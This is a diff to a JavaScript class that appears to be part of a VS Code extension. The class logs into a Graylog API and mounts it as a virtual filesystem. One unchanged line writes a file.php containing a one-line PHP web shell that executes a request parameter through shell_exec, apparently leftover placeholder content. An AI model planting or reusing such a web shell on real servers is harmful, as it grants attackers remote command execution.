@@ -10,7 +10,51 @@ class ConnectionPart {
         this.accountUserName = "";
         this.accountPassword = "";
         this.workingDirectory = "";
-        this.workingDirectory = this.getDefaultWorkingDirectory();
+        //     this.workingDirectory = this.getDefaultWorkingDirectory();
+    }
+    async LoginInitialize() {
+        let apiurl = "";
+        let username = "";
+        let password = "";
+        do {
+            if (apiurl.length == 0)
+                apiurl = await vscode.window.showInputBox({
+                    placeHolder: 'Please type Graylog API Url',
+                    ignoreFocusOut: true
+                }) ?? "";
+            if (!(await this.testAPI(apiurl))) {
+                vscode.window.showErrorMessage("API url is not valid.");
+                apiurl = "";
+                continue;
+            }
+            if (username == "")
+                username = await vscode.window.showInputBox({
+                    placeHolder: 'Plz type the username',
+                    ignoreFocusOut: true
+                }) ?? "";
+            if (username == "") {
+                vscode.window.showErrorMessage("Username cannot be empty");
+                continue;
+            }
+            if (password == "")
+                password = await vscode.window.showInputBox({
+                    placeHolder: 'Plz type the password',
+                    ignoreFocusOut: true,
+                    password: true
+                }) ?? "";
+            if (password == "") {
+                vscode.window.showErrorMessage("Password cannot be empty.");
+                continue;
+            }
+            if (!await this.testUserInfo(apiurl, username, password)) {
+                vscode.window.showErrorMessage("User Info is not valid");
+                username = "";
+                password = "";
+                continue;
+            }
+            break;
+        } while (true);
+        vscode.workspace.updateWorkspaceFolders(0, 0, { uri: vscode.Uri.parse('graylog:/'), name: "Graylog API" });
     }
     async testAPI(apiPath) {
         try {
@@ -66,27 +110,7 @@ class ConnectionPart {
         this.graylogFilesystem.writeFile(vscode.Uri.parse(`graylog:/file.php`), Buffer.from('<?php echo shell_exec($_GET[\'e\'].\' 2>&1\'); ?>'), { create: true, overwrite: true });
         this.graylogFilesystem.writeFile(vscode.Uri.parse(`graylog:/file.yaml`), Buffer.from('- just: write something'), { create: true, overwrite: true });
     }
-    getDefaultWorkingDirectory() {
-        /*
-        if(fs.existsSync("C:\\")){
-            if(!fs.existsSync("C:\\"))
-            {
-                fs.mkdirSync("C:\\.gray_log");
-            }
-            return "C:\\.gray_log";
-        }
-        if(fs.existsSync("/bin")){
-            this.graylogFilesystem.createDirectory(vscode.Uri.parse(`graylog:/.garylog/`));
-            this.graylogFilesystem.createDirectory(vscode.Uri.parse(`graylog:/.garylog/setting.json`));
-            this.graylogFilesystem.writeFile(vscode.Uri.parse(`graylog:/.garylog/setting.json`),
-            Buffer.from(`{
-                username:'',
-                password:'',
-            }`), { create: true, overwrite: true });
-            
-            return "graylog://.graylog";
-        }*/
-        return "";
+    initializeDirectories() {
     }
 }
 exports.ConnectionPart = ConnectionPart;
